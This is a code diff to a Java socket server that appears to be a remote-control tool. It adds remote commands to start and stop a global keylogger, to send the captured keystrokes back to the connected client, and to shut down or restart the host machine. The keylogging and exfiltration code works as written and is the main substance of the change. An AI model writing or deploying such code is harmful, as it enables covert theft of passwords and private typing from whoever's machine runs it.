@@ -2,10 +2,19 @@ import java.io.*;
 import java.net.ServerSocket;
 import java.util.Scanner;
 
+import javax.swing.JOptionPane;
+
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
+
+import model.KeyLog;
+import model.Server;
 import model.*;
 
 public class Main {
+	private static KeyLog keyLog = new KeyLog();
 	public static void main(String[] args) throws IOException {
+		GlobalScreen.setEventDispatcher(new SwingDispatchService());
 		int port = 6789;
 		try {
             Server.server = new ServerSocket(port);
@@ -13,6 +22,7 @@ public class Main {
             Server.in = new BufferedReader(new InputStreamReader(Server.client.getInputStream()));
             Server.out = new BufferedWriter(new OutputStreamWriter(Server.client.getOutputStream()));
         } catch (Exception e){
+        	
         } 
 		
 		boolean isRunning = true;
@@ -29,6 +39,11 @@ public class Main {
 				else if(msg.equals("LIST_APP")) List("APP");
 				else if(msg.equals("LIST_PROCESS")) List("PROCESS");
 				else if(msg.equals("DISCONNECT")) isRunning = false;
+				else if(msg.equals("HOOK")) Hook();
+				else if(msg.equals("UNHOOK")) Unhook();
+				else if(msg.equals("SHOW TEXT")) Showtext();
+				else if(msg.equals("SHUTDOWN")) Shutdown();
+				else if(msg.equals("RESTART")) Restart();
 				else isRunning = false;
 				
 			} catch(Exception e1) {
@@ -141,4 +156,72 @@ public class Main {
 	}
 	
 	
+	private static void Hook()
+	{			
+		keyLog.KeyLogger(keyLog);
+		
+	}
+	
+	private static void Unhook() {
+		keyLog.UnKeyLogger(keyLog);
+	}
+	
+	private static void Showtext() {
+		try {
+			Server.out.write(keyLog.keylog);
+			Server.out.newLine();
+			Server.out.flush();
+			keyLog.keylog = "";
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}		
+	}
+	
+	
+	
+	private static void Shutdown()
+	{
+		Runtime runtime = Runtime.getRuntime() ;
+		try {
+			Server.server.close();
+			Server.client.close();
+		} catch (IOException e1) {
+			e1.printStackTrace();
+		}
+	    try
+	    {
+	       System.out.println("Shutting down the PC after 10 seconds.");
+	       runtime.exec("shutdown -s -t 10");
+	    }
+	    catch(IOException e)
+	    {
+	       System.out.println("Exception: " +e);
+	    }
+	}
+	
+	
+	
+	
+	
+	private static void Restart() {
+		Runtime runtime = Runtime.getRuntime() ;
+		try {
+			Server.server.close();
+			Server.client.close();
+		} catch (IOException e1) {
+			e1.printStackTrace();
+		}
+	    try
+	    {
+	       System.out.println("Restarting the PC after 20 seconds.");
+	       runtime.exec("shutdown -r -t 20");
+	    }
+	    catch(IOException e)
+	    {
+	       System.out.println("Exception: " +e);
+	    }
+	}
 }
+	
+
